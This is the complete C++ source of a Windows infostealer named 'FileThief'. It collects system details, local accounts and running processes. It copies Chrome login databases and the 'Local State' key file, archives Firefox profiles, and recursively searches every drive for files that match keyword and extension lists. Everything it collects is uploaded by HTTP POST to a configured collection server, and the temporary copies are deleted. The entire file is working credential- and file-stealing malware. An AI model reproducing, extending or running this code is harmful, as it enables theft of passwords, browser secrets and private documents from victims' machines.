#include "FileThief.h"

char Domain[] = "127.0.0.1";
int dwPort = 8000;

int Init() {
	WSAData wsaData;
	WORD version = MAKEWORD(2, 2);
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	return iResult;
}

int SendFile(wchar_t* FileName) {
	wchar_t* wPtr = 0;
	char cUrlFileName[260];
	for (int n = 0; FileName[n] != 0; n++) {
		if (FileName[n] == L'\\')wPtr = FileName + n + 1;
	}
	size_t s;
	wstring urlText = UrlEncode(wPtr);
	wcstombs_s(&s, cUrlFileName, urlText.c_str(), 260);
	strcat_s(cUrlFileName, ".bak");
	
	HANDLE pFile = CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (pFile == INVALID_HANDLE_VALUE) {
		printf("CreateFileA Error.\n");
		CloseHandle(pFile);
		return 0;
	}
	DWORD dwFileSize = GetFileSize(pFile, 0);
	BYTE* buffer = (BYTE*)malloc(dwFileSize), * ptr = buffer;
	memset(buffer, 0, dwFileSize);
	DWORD dwReaded = 0, dwToRead = dwFileSize;
	do {
		ReadFile(pFile, ptr, dwToRead, &dwReaded, 0);
		dwToRead -= dwReaded;
		ptr += dwReaded;
	} while (dwToRead > 0);
	CloseHandle(pFile);

	SOCKET sConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct hostent* host;
	if ((host = gethostbyname(Domain)) == NULL)
	{
		free(buffer);
		return 0;
	}

	SOCKADDR_IN addr;
	memset(&addr, 0, sizeof(addr));
	addr.sin_addr.s_addr = *(long*)(host->h_addr_list[0]);
	addr.sin_family = AF_INET;
	addr.sin_port = htons(dwPort);

	int ret = connect(sConnect, (SOCKADDR*)&addr, sizeof(addr));
	if (ret == SOCKET_ERROR) {
		printf("Connect error.\n");
		free(buffer);
		return 0;
	}

	char header[10000],
		boundary[] = "----WebKitFormBoundaryoLTIMcH0uHkRUjxB",
		header_template[] = "POST / HTTP/1.1\r\n"
		"Host: %s:%d\r\n"
		"Cache-Control: max-age=0\r\n"
		"Upgrade-Insecure-Requests: 1\r\n"
		"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36\r\n"
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
		"Accept-Encoding: gzip, deflate\r\n"
		"Accept-Language: zh-CN,zh;q=0.9\r\n"
		"Content-Type: multipart/form-data; boundary=%s\r\n"
		"Content-Length: %d\r\n"
		"Connection: close\r\n";
	char ContentHeader[1000],
		ContentHeaderTemplate[] =
		"\r\n"
		"--%s\r\n"
		"Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
		"\r\n";
	memset(ContentHeader, 0, 1000);
	sprintf_s(ContentHeader, 1000, ContentHeaderTemplate, boundary, cUrlFileName);

	char END[100];
	memset(END, 0, 100);
	sprintf_s(END, 100, "\r\n--%s--\r\n", boundary);

	memset(header, 0, 10000);
	sprintf_s(header, 10000, header_template, Domain, dwPort, boundary, dwFileSize + strlen(ContentHeader) + strlen(END));
	//cout << header << ContentHeader << buffer << END;

	send(sConnect, header, strlen(header), 0);
	send(sConnect, ContentHeader, strlen(ContentHeader), 0);
	send(sConnect, (char*)buffer, dwFileSize, 0);
	send(sConnect, END, strlen(END), 0);
	send(sConnect, "\n\n\n\n", 4, 0);

	char response[10000];
	memset(response, 0, 10000);
	for (int n = 0; n < 10; n++) {
		recv(sConnect, response, 1, 0);
		//printf(response);
	}

	free(buffer);
	return 1;
}

int CheckFileType(wchar_t* FileName) {
	wchar_t* ptr = FileName;
	for (int n = 0; FileName[n] != '\0'; n++) {
		//printf("%c\n",FileName[n]);
		if (FileName[n] == '.') {
			ptr = FileName + n + 1;
		}
	}
	if (ptr == FileName)return 0;
	for (int n = 0; type[n][0] != '\0'; n++) {
		if (wcscmp(ptr, type[n]) == 0) {
			wprintf(L"%ws:\t", FileName);
			wprintf(L"%s:\t%s\n", ptr, type[n]);
			return 1;
		}
	}
	return 0;
}

int SearchKeyword(wchar_t* FileName) {
	wchar_t* wPtr = FileName;
	for (int n = 0; FileName[n] != 0; n++) {
		if (FileName[n] == L'\\')wPtr = FileName + n + 1;
	}

	for (int n = 0; wKeyword[n][0] != L'\0'; n++) {
		if (wcsstr(wPtr, wKeyword[n])) {
			wprintf(L"%s\t%s\n", wPtr, wKeyword[n]);
			return 1;
		}
	}
	return 0;
}

int ListFolderRecursive(wchar_t* inputFolder) {
	wchar_t path[260];
	memset(path, 0, 260);
	swprintf_s(path, L"%s*", inputFolder);
	WIN32_FIND_DATAW pNextInfo;
	HANDLE file;
	file = FindFirstFileW(path, &pNextInfo);
	if (file == INVALID_HANDLE_VALUE) {
		//printf("Find First Error.\n");
		CloseHandle(file);
		return 0;
	}
	while (FindNextFileW(file, &pNextInfo))
	{
		if (pNextInfo.cFileName[0] == '.')continue;
		wchar_t FullFileName[260];
		memset(FullFileName, 0, 260);
		swprintf_s(FullFileName, 260, L"%s%s", inputFolder, pNextInfo.cFileName);
		//printf("%s\n", FullFileName);
		if (PathIsDirectoryW(FullFileName)) {
			wcscat_s(FullFileName, 260, L"\\");
			ListFolderRecursive(FullFileName);
		}
		else {
			if (SearchKeyword(FullFileName)) {
				wprintf(L"Keyword: %s\n", FullFileName);
				SendFile(FullFileName);
			}
			else if (CheckFileType(FullFileName)) {
				wprintf(L"Type: %s\n", FullFileName);
				SendFile(FullFileName);
			}
		}
	}
	return 1;
}

int GetChromeDatabase() {
	wchar_t ChromePath[260], target[260], temp[260], publicPath[260] = L"C:\\Users\\Public\\";
	memset(ChromePath, 0, 260);
	GetEnvironmentVariableW(L"LOCALAPPDATA", ChromePath, 260);
	wcsncat_s(ChromePath, L"\\Google\\Chrome\\User Data\\", 260);

	memset(target, 0, 260);
	memset(temp, 0, 260);
	swprintf_s(target, L"%s%s", ChromePath, L"Local State");
	swprintf_s(temp, L"%s%s", publicPath, L"Local State");
	CopyFileW(target, temp, 0);
	SendFile(temp);
	DeleteFileW(temp);

	memset(target, 0, 260);
	memset(temp, 0, 260);
	swprintf_s(target, L"%s%s", ChromePath, L"Default\\Login Data");
	swprintf_s(temp, L"%s%s", publicPath, L"Login Data");
	CopyFileW(target, temp, 0);
	SendFile(temp);
	DeleteFileW(temp);

	memset(target, 0, 260);
	memset(temp, 0, 260);
	swprintf_s(target, L"%s%s", ChromePath, L"Default\\Login Data For Account");
	swprintf_s(temp, L"%s%s", publicPath, L"Login Data For Account");
	CopyFileW(target, temp, 0);
	SendFile(temp);
	DeleteFileW(temp);
	return 0;
}

int GetFirefoxDatabase() {
	char FirefoxPath[260], cmd[260], publicPath[260] = "C:\\Users\\Public\\firefox.zip";
	memset(FirefoxPath, 0, 260);
	GetEnvironmentVariableA("APPDATA", FirefoxPath, 260);
	strncat_s(FirefoxPath, "\\Mozilla\\Firefox\\Profiles", 260);
	sprintf_s(cmd, "powershell Compress-Archive %s %s", FirefoxPath, publicPath);
	//printf("%s", cmd);
	system(cmd);
	wchar_t file[260] = L"C:\\Users\\Public\\firefox.zip";
	SendFile(file);
	DeleteFileW(file);
	return 0;
}

int GetSystemInfo() {
	char* buf = (char*)malloc(0x10000);
	char cComputerName[0x100], temp[0x100];
	LPBYTE localUser = NULL;
	DWORD dwSize;

	memset(buf, 0, 0x10000);
	memset(cComputerName, 0, 0x100);

	//system("cmd /c whoami > C:\\Users\\Public\\sysinfo.txt");
	GetUserNameA(buf, &dwSize);
	strcat_s(buf, 0x10000, "\r\n");
	
	//system("cmd /c net user >> C:\\Users\\Public\\sysinfo.txt");
	dwSize = 0x100;
	if (!GetComputerNameA(cComputerName, &dwSize))
		printf("%d\n", GetLastError());
	strcat_s(buf, 0x10000, "ComputerName:\t");
	strcat_s(buf, 0x10000, cComputerName);
	strcat_s(buf, 0x10000, "\r\n");
	wchar_t wComputerName[0x100];
	size_t s;
	DWORD dwEntriesRead = 0, dwTotalEntries = 0, dwResumeHandle = 0;
	mbstowcs_s(&s, wComputerName, cComputerName, 0x100);
	NetUserEnum(wComputerName, 0, FILTER_NORMAL_ACCOUNT, &localUser,
		MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle);

	strcat_s(buf, 0x10000, "Local User:\r\n\t");
	LPUSER_INFO_0 pTmpBuf = (LPUSER_INFO_0)localUser;
	//printf("dwEntriesRead: %d\n", dwEntriesRead);
	for (int n = 0; n < dwEntriesRead; n++) {
		memset(temp, 0, 0x100);
		wcstombs_s(&s, temp, pTmpBuf->usri0_name, 0x100);
		strcat_s(buf, 0x10000, temp);
		strcat_s(buf, 0x10000, "\r\n\t");
		//wprintf(L"%s\n", pTmpBuf->usri0_name);
		pTmpBuf++;
	}
	buf[strlen(buf) - 1] = 0;
	
	//system("cmd /c ipconfig >> C:\\Users\\Public\\sysinfo.txt");
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		free(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		strcat_s(buf, 0x10000, "Adapters:\r\n");
		while (pAdapter) {
			//printf("\tComboIndex: \t%d\n", pAdapter->ComboIndex);
			strcat_s(buf, 0x10000, "\tIndex: \t");
			memset(temp, 0, 0x100);
			sprintf_s(temp, "%d", pAdapter->Index);
			strcat_s(buf, 0x10000, temp);
			//printf("\tAdapter Name: \t%s\n", pAdapter->AdapterName);
			strcat_s(buf, 0x10000, "\r\n\tAdapter Name: \t");
			strcat_s(buf, 0x10000, pAdapter->AdapterName);
			//printf("\tAdapter Desc: \t%s\n", pAdapter->Description);
			strcat_s(buf, 0x10000, "\r\n\tAdapter Desc: \t");
			strcat_s(buf, 0x10000, pAdapter->Description);
			//printf("\tAdapter Addr: \t");
			strcat_s(buf, 0x10000, "\r\n\tAdapter Addr: \t");
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1)) {
					//printf("%.2X\n", (int)pAdapter->Address[i]);
					memset(temp, 0, 0x100);
					sprintf_s(temp, "%.2X", pAdapter->Address[i]);
					strcat_s(buf, 0x10000, temp);
				}
				else {
					//printf("%.2X-", (int)pAdapter->Address[i]);
					memset(temp, 0, 0x100);
					sprintf_s(temp, "%.2X", pAdapter->Address[i]);
					if (strlen(temp) == 1)
						strcat_s(buf, 0x10000, "0");
					strcat_s(buf, 0x10000, temp);
					strcat_s(buf, 0x10000, "-");
				}
			}
			//printf("\tType: \t");
			strcat_s(buf, 0x10000, "\r\n\tType: \t");
			switch (pAdapter->Type) {
			case MIB_IF_TYPE_OTHER:
				strcat_s(buf, 0x10000, "Other\r\n");
				break;
			case MIB_IF_TYPE_ETHERNET:
				strcat_s(buf, 0x10000, "Ethernet\r\n");
				break;
			case MIB_IF_TYPE_TOKENRING:
				strcat_s(buf, 0x10000, "Token Ring\r\n");
				break;
			case MIB_IF_TYPE_FDDI:
				strcat_s(buf, 0x10000, "FDDI\r\n");
				break;
			case MIB_IF_TYPE_PPP:
				strcat_s(buf, 0x10000, "PPP\r\n");
				break;
			case MIB_IF_TYPE_LOOPBACK:
				strcat_s(buf, 0x10000, "Lookback\r\n");
				break;
			case MIB_IF_TYPE_SLIP:
				strcat_s(buf, 0x10000, "Slip\r\n");
				break;
			default:
				strcat_s(buf, 0x10000, "Unknown type %ld\r\n");
				memset(temp, 0, 0x100);
				sprintf_s(temp, "%d", pAdapter->Type);
				strcat_s(buf, 0x10000, temp);
				break;
			}

			//printf("\tIP Address: \t%s\n", pAdapter->IpAddressList.IpAddress.String);
			strcat_s(buf, 0x10000, "\tIP Address: \t");
			strcat_s(buf, 0x10000, pAdapter->IpAddressList.IpAddress.String);
			//printf("\tIP Mask: \t%s\n", pAdapter->IpAddressList.IpMask.String);
			strcat_s(buf, 0x10000, "\r\n\tIP Mask: \t");
			strcat_s(buf, 0x10000, pAdapter->IpAddressList.IpMask.String);
			//printf("\tGateway: \t%s\n", pAdapter->GatewayList.IpAddress.String);
			strcat_s(buf, 0x10000, "\r\n\tGateway: \t");
			strcat_s(buf, 0x10000, pAdapter->GatewayList.IpAddress.String);
			
			if (pAdapter->DhcpEnabled) {
				//printf("\tDHCP Server: \t%s\n", pAdapter->DhcpServer.IpAddress.String);
				strcat_s(buf, 0x10000, "\r\n\tDHCP Server: \t");
				strcat_s(buf, 0x10000, pAdapter->DhcpServer.IpAddress.String);
			}

			pAdapter = pAdapter->Next;
			strcat_s(buf, 0x10000, "\r\n\r\n");
		}
	}
	else
		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);
	if (pAdapterInfo)
		free(pAdapterInfo);
	

	//system("cmd /c tasklist >> C:\\Users\\Public\\sysinfo.txt");
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	//std::wstring ccdName = L"ccd.exe";

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE) {
		//printf("PID\tProcessName");
		strcat_s(buf, 0x10000, "PID\tProcessName\r\n");
		while (Process32Next(snapshot, &entry) == TRUE) {
			//wprintf(L"%d\t%s\n", entry.th32ProcessID, entry.szExeFile);
			memset(temp, 0, 0x100);
			sprintf_s(temp, 0x100, "%d\t%ws\r\n", entry.th32ProcessID, entry.szExeFile);
			strcat_s(buf, 0x10000, temp);
		}
	}
	CloseHandle(snapshot);

	wchar_t publicPath[260] = L"C:\\Users\\Public\\sysinfo.txt";
	//printf("%s\n", buf);
	HANDLE hFile = CreateFileW(publicPath, GENERIC_ALL, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	DWORD dwWrited;
	WriteFile(hFile, buf, strlen(buf), &dwWrited, 0);
	CloseHandle(hFile);
	free(buf);
	SendFile(publicPath);
	DeleteFileW(publicPath);
	return 0;
}

int main() {
	Init();

	GetSystemInfo();
	GetFirefoxDatabase();
	GetChromeDatabase();

	wchar_t szDrive[] = L"A:\\";
	DWORD uDriveMask = GetLogicalDrives();
	if (uDriveMask == 0)return 0;

	while (uDriveMask)
	{
		if (uDriveMask & 1) {
			ListFolderRecursive(szDrive);
		}
		++szDrive[0];
		uDriveMask >>= 1;
	}
	return 0;
}